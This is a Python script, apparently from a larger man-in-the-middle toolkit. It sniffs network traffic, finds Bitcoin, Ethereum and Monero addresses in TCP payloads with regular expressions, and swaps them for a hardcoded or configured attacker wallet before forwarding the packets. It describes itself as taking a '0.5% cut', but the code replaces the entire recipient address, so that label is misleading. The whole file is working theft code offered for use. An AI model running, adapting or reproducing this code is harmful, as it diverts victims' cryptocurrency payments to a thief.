#!/usr/bin/env python3
"""
transaction_modifier.py - Transaction modifier (0.5% cut)
Supports Monero, Bitcoin, Ethereum
"""

from scapy.all import sniff, IP, TCP, send
import re
import json
import os
from datetime import datetime
from pathlib import Path
from dotenv import load_dotenv
from .utils import setup_logging, log_modification, enable_ip_forwarding

load_dotenv()

logger = setup_logging("transaction_modifier")

BASE_DIR = Path(__file__).resolve().parent.parent.parent.parent
CONFIG_FILE = BASE_DIR / "config.json"
WALLET_FILE = BASE_DIR / "data" / "wallet.json"

def get_wallet_address():
    env_wallet = os.getenv("MONERO_WALLET_ADDRESS")
    if env_wallet:
        return env_wallet
    
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE, "r") as f:
            config = json.load(f)
            wallet = config.get("bgp_mitm", {}).get("test_wallet")
            if wallet:
                return wallet
    
    return "47SuVgVRZkQaVW3TauHdKCKVB7ynhtWzsARE9tesy2mYQrKSg2ErUibcx8okZFPkxYbVcsBCZsK1HAH3mci4uNA198NCpTG"

def get_wallet_type():
    env_type = os.getenv("WALLET_TYPE")
    if env_type:
        return env_type.lower()
    return "monero"

TEST_WALLET = get_wallet_address()
TAKE_PERCENT = float(os.getenv("TAKE_PERCENT", 0.5))
WALLET_TYPE = get_wallet_type()

logger.info(f"Wallet Type: {WALLET_TYPE}")
logger.info(f"Wallet: {TEST_WALLET[:20]}...")
logger.info(f"Take: {TAKE_PERCENT}%")

PATTERNS = {
    "Bitcoin": r"1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[a-z0-9]{39,59}",
    "Ethereum": r"0x[a-fA-F0-9]{40}",
    "Monero": r"4[1-9A-HJ-NP-Za-km-z]{94}",
}

FOCUS_PATTERN = {
    "bitcoin": PATTERNS["Bitcoin"],
    "ethereum": PATTERNS["Ethereum"],
    "monero": PATTERNS["Monero"],
}

def get_focus_pattern():
    pattern = FOCUS_PATTERN.get(WALLET_TYPE.lower(), PATTERNS["Monero"])
    return re.compile(pattern.encode())

def modify_transaction(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        try:
            payload = bytes(packet[TCP].payload)
            pattern = get_focus_pattern()
            
            if pattern.search(payload):
                new_payload = pattern.sub(TEST_WALLET.encode(), payload)
                
                if new_payload != payload:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    msg = f"[{timestamp}] Modified: {packet[IP].src} -> {packet[IP].dst}"
                    print(f"[+] {msg}")
                    log_modification(msg)
                    log_modification(f"    Wallet Type: {WALLET_TYPE}")
                    log_modification(f"    Target Wallet: {TEST_WALLET[:20]}...")
                    
                    packet[TCP].payload = new_payload
                    del packet[IP].chksum
                    del packet[TCP].chksum
                    send(packet)
                    
                    log_modification(f"[+] {TAKE_PERCENT}% cut taken on {WALLET_TYPE} transaction")
        except Exception as e:
            pass

def start_modifier(interface=None):
    if not interface:
        interface = "eth0"
    enable_ip_forwarding()
    logger.info("=" * 60)
    logger.info("TRANSACTION MODIFIER STARTED")
    logger.info(f"Interface: {interface}")
    logger.info(f"Wallet Type: {WALLET_TYPE}")
    logger.info(f"Wallet: {TEST_WALLET[:20]}...")
    logger.info(f"Take: {TAKE_PERCENT}% cut")
    logger.info("=" * 60)
    sniff(iface=interface, prn=modify_transaction, store=0)